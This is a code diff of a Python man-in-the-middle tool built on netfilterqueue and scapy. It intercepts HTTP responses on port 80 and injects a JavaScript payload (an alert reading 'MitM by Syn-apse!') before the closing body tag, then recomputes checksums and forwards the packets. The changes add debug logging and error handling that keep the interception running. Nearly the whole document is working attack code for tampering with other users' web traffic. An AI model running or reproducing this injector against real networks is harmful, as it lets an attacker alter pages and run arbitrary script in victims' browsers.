@@ -1,55 +1,51 @@
-import netfilterqueue
 import scapy.all as scapy
+import traceback # Import the traceback module for detailed errors
+import netfilterqueue
 
-# Javascript injection string
 INJECTION_SCRIPT = b"<script>alert('MitM by Syn-apse!')</script>"
 
 def process_packet(packet):
-    """
-    This function is called for each packet in the NFQUEUE.
-    It checks for HTTP responses and injects a script.
-    """
-    scapy_packet = scapy.IP(packet.get_payload())
+    try:
+        print("\n--- [1] Packet Received by Queue ---")
+        scapy_packet = scapy.IP(packet.get_payload())
+        print("[2] Packet Parsed by Scapy. Summary:", scapy_packet.summary())
 
-    print(scapy_packet.summary())
+        modified = False
+        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
+            if scapy_packet[scapy.TCP].sport == 80:
+                print("[3] HTTP Response Detected.")
+                # Make sure the payload is bytes before checking for bytes
+                if isinstance(scapy_packet[scapy.Raw].load, bytes) and b"</body>" in scapy_packet[scapy.Raw].load:
+                    print("[4] HTML Body Found. Injecting script...")
+                    
+                    load = scapy_packet[scapy.Raw].load
+                    modified_load = load.replace(b"</body>", INJECTION_SCRIPT + b"</body>")
+                    scapy_packet[scapy.Raw].load = modified_load
+                    
+                    del scapy_packet[scapy.IP].len
+                    del scapy_packet[scapy.IP].chksum
+                    del scapy_packet[scapy.TCP].chksum
+                    
+                    packet.set_payload(bytes(scapy_packet))
+                    modified = True
+        
+        print(f"[5] Packet processed. Modified: {modified}. Releasing from queue...")
+        packet.accept()
+        print("[6] Packet Accepted by Kernel.")
 
-    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
-
-        # Look for HTTP responses coming FROM port 80
-        if scapy_packet[scapy.TCP].sport == 80:
-            http_load = scapy_packet[scapy.Raw].load
-            # Check if it's an HTML page
-            if b"</body>" in http_load and b"Content-Type: text/html" in http_load:
-                print("[+] HTML Response detected. Injecting script...")
-                
-                # Replace the closing body tag with our script + the closing tag
-                modified_load = http_load.replace(b"</body>", INJECTION_SCRIPT + b"</body>")
-                
-                # Set the modified load back into the packet
-                scapy_packet[scapy.Raw].load = modified_load
-                
-                # Scapy needs to recalculate checksums and length after modification.
-                # Deleting them makes scapy handle it automatically upon conversion to bytes.
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].chksum
-                
-                # Set the payload of the original queue packet to our modified packet
-                packet.set_payload(bytes(scapy_packet))
-
-    # Forward the packet (whether it was modified or not)
-    packet.accept()
-
+    except Exception:
+        # If ANY error occurs, print the full traceback and still accept the packet
+        print("\n[!!!] CRITICAL ERROR IN process_packet [!!!]")
+        traceback.print_exc()
+        packet.accept() # Accept the packet anyway to keep the connection alive
 
 def start():
-    """
-    Starts the packet interception queue.
-    """
     queue = netfilterqueue.NetfilterQueue()
-    queue.bind(0, process_packet) # Bind to queue 0 and set the callback
+    queue.bind(0, process_packet)
     print("[*] Packet modifier started. Waiting for traffic...")
     try:
         queue.run()
     except KeyboardInterrupt:
         print("\n[*] Shutting down packet modifier.")
         queue.unbind()
+
